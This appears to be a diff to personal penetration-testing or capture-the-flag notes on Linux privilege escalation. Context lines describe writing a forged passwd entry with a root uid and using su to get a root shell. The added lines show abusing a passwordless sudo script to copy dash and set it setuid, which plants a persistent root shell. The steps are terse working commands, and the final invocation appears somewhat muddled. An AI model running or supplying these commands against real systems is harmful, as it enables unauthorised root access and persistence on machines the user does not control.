@@ -375,7 +375,15 @@ $1$user$sfjfd.3434jLJljdiqj:root:/root:/bin/bash
 # copy back passwd file from attacker's pc on box. run
 su user
 #it will ask for password type admin and we get root shell
+---------------------------------------------------------------------------------------
 
+
+Linux Priv Esc
+-- if we have an output after sudo -l => root (NOPASSWD) path/to/file/zz.sh. let's make a file and put inside see below: 
+cp /bin/dash /var/tmp/dash ; chmod u+s /var/tmp/dash
+then run
+
+zz.sh -p
 
 
 
